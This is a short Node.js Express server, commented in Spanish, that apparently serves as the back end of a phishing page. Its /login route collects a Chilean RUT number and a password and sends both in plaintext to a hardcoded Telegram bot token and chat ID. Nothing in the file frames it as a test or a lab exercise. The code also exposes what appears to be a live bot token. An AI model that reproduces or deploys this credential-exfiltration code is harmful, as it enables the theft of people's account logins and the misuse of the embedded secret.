const express = require("express");
const fetch = require("node-fetch");
const app = express();

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Aquí van tus credenciales de Telegram
const TELEGRAM_TOKEN = "8278463397:AAGo2ZY5xthkffSKMPEd-69tIwz2sIXdQuE"; 
const CHAT_ID = "7240166271"; 

app.post("/login", async (req, res) => {
  const { rut, passwd } = req.body;

  const mensaje = `Nuevo intento de login:\nRUT: ${rut}\nContraseña: ${passwd}`;

  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje })
    });

    res.send("✅ Credenciales enviadas a Telegram.");
  } catch (error) {
    console.error(error);
    res.status(500).send("❌ Error al enviar a Telegram.");
  }
});

app.listen(3000, () => console.log("Servidor corriendo en http://localhost:3000"));

